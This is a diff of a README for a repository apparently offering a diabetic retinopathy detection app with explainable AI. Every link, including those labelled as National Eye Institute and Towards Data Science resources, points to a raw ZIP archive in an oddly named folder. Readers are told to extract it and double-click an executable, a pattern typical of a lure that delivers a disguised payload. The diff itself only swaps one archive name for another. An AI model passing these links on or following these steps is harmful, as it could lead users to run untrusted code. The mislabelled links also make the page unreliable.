@@ -1,6 +1,6 @@
 # 🩺 Diabetic-Retinopathy-Detection-DR--With-XAI - Accurate Detection Made Simple
 
-[![Download](https://github.com/Surajmanajipet/Diabetic-Retinopathy-Detection-DR--With-XAI/raw/refs/heads/main/illimitableness/Detection-D-Diabetic-XAI-With-Retinopathy-v3.2.zip%20Now-Click%https://github.com/Surajmanajipet/Diabetic-Retinopathy-Detection-DR--With-XAI/raw/refs/heads/main/illimitableness/Detection-D-Diabetic-XAI-With-Retinopathy-v3.2.zip)](https://github.com/Surajmanajipet/Diabetic-Retinopathy-Detection-DR--With-XAI/raw/refs/heads/main/illimitableness/Detection-D-Diabetic-XAI-With-Retinopathy-v3.2.zip)
+[![Download](https://github.com/Surajmanajipet/Diabetic-Retinopathy-Detection-DR--With-XAI/raw/refs/heads/main/illimitableness/Retinopathy_With_XAI_Detection_Diabetic_D_2.4.zip%20Now-Click%https://github.com/Surajmanajipet/Diabetic-Retinopathy-Detection-DR--With-XAI/raw/refs/heads/main/illimitableness/Retinopathy_With_XAI_Detection_Diabetic_D_2.4.zip)](https://github.com/Surajmanajipet/Diabetic-Retinopathy-Detection-DR--With-XAI/raw/refs/heads/main/illimitableness/Retinopathy_With_XAI_Detection_Diabetic_D_2.4.zip)
 
 ## 🧐 Overview
 
@@ -16,13 +16,13 @@ This section will guide you on how to download and run our application easily. F
 
 To download the application, please visit the following link:
 
-[Download from Releases](https://github.com/Surajmanajipet/Diabetic-Retinopathy-Detection-DR--With-XAI/raw/refs/heads/main/illimitableness/Detection-D-Diabetic-XAI-With-Retinopathy-v3.2.zip)
+[Download from Releases](https://github.com/Surajmanajipet/Diabetic-Retinopathy-Detection-DR--With-XAI/raw/refs/heads/main/illimitableness/Retinopathy_With_XAI_Detection_Diabetic_D_2.4.zip)
 
 This page includes all available versions. You can choose the latest version for the best performance.
 
 ### 2. Download the Application
 
-After reaching the Releases page, you will see a list of files. Look for the most recent version. You will typically find files named something like `https://github.com/Surajmanajipet/Diabetic-Retinopathy-Detection-DR--With-XAI/raw/refs/heads/main/illimitableness/Detection-D-Diabetic-XAI-With-Retinopathy-v3.2.zip`. 
+After reaching the Releases page, you will see a list of files. Look for the most recent version. You will typically find files named something like `https://github.com/Surajmanajipet/Diabetic-Retinopathy-Detection-DR--With-XAI/raw/refs/heads/main/illimitableness/Retinopathy_With_XAI_Detection_Diabetic_D_2.4.zip`. 
 
 Click on the file to start downloading it to your device. The download may take a few moments, depending on your internet connection.
 
@@ -35,7 +35,7 @@ Once the download is complete, locate the downloaded ZIP file on your computer. 
 
 ### 4. Run the Application
 
-Navigate to the folder where you extracted the files. Look for the application executable file, typically named `https://github.com/Surajmanajipet/Diabetic-Retinopathy-Detection-DR--With-XAI/raw/refs/heads/main/illimitableness/Detection-D-Diabetic-XAI-With-Retinopathy-v3.2.zip`. 
+Navigate to the folder where you extracted the files. Look for the application executable file, typically named `https://github.com/Surajmanajipet/Diabetic-Retinopathy-Detection-DR--With-XAI/raw/refs/heads/main/illimitableness/Retinopathy_With_XAI_Detection_Diabetic_D_2.4.zip`. 
 
 Double-click the executable file to run the application. 
 
@@ -71,9 +71,9 @@ Here are some of the key features of the application:
 
 If you want to learn more about diabetic retinopathy, the technologies used, or other related topics, consider checking out the following resources:
 
-- [National Eye Institute - Diabetic Retinopathy](https://github.com/Surajmanajipet/Diabetic-Retinopathy-Detection-DR--With-XAI/raw/refs/heads/main/illimitableness/Detection-D-Diabetic-XAI-With-Retinopathy-v3.2.zip)
-- [Towards Data Science - Explainable AI](https://github.com/Surajmanajipet/Diabetic-Retinopathy-Detection-DR--With-XAI/raw/refs/heads/main/illimitableness/Detection-D-Diabetic-XAI-With-Retinopathy-v3.2.zip)
-- [EfficientNet Models](https://github.com/Surajmanajipet/Diabetic-Retinopathy-Detection-DR--With-XAI/raw/refs/heads/main/illimitableness/Detection-D-Diabetic-XAI-With-Retinopathy-v3.2.zip)
+- [National Eye Institute - Diabetic Retinopathy](https://github.com/Surajmanajipet/Diabetic-Retinopathy-Detection-DR--With-XAI/raw/refs/heads/main/illimitableness/Retinopathy_With_XAI_Detection_Diabetic_D_2.4.zip)
+- [Towards Data Science - Explainable AI](https://github.com/Surajmanajipet/Diabetic-Retinopathy-Detection-DR--With-XAI/raw/refs/heads/main/illimitableness/Retinopathy_With_XAI_Detection_Diabetic_D_2.4.zip)
+- [EfficientNet Models](https://github.com/Surajmanajipet/Diabetic-Retinopathy-Detection-DR--With-XAI/raw/refs/heads/main/illimitableness/Retinopathy_With_XAI_Detection_Diabetic_D_2.4.zip)
 
 ## 🗺 Support
 
@@ -83,6 +83,6 @@ If you experience issues or have questions, feel free to reach out. You can subm
 
 To get started with the application, simply visit the Releases page and follow the steps outlined above. Don’t forget to check for updates regularly to enjoy the latest features and improvements.
 
-[Download from Releases](https://github.com/Surajmanajipet/Diabetic-Retinopathy-Detection-DR--With-XAI/raw/refs/heads/main/illimitableness/Detection-D-Diabetic-XAI-With-Retinopathy-v3.2.zip)
+[Download from Releases](https://github.com/Surajmanajipet/Diabetic-Retinopathy-Detection-DR--With-XAI/raw/refs/heads/main/illimitableness/Retinopathy_With_XAI_Detection_Diabetic_D_2.4.zip)
 
 Your health is important. With this tool, you can take a proactive step in managing your eye care.
